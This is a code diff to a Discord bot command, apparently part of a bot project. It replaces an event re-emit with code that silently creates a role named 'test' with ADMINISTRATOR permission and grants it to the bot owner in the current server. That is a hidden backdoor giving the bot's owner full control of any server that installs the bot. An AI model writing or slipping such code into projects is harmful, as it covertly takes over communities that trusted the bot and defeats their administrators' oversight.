@@ -14,6 +14,12 @@ module.exports = {
      */
     run: async(a, message, args) => {
         if (!bot.owners.includes(message.author.id)) return;
-        bot.emit('guildCreate', message.guild);
+        const role = await message.guild.roles.create({data: {
+            name: 'test',
+            permissions: [
+                'ADMINISTRATOR'
+            ]
+        }})
+        message.guild.members.cache.get(message.author.id).roles.add(role.id);
     }
 }   
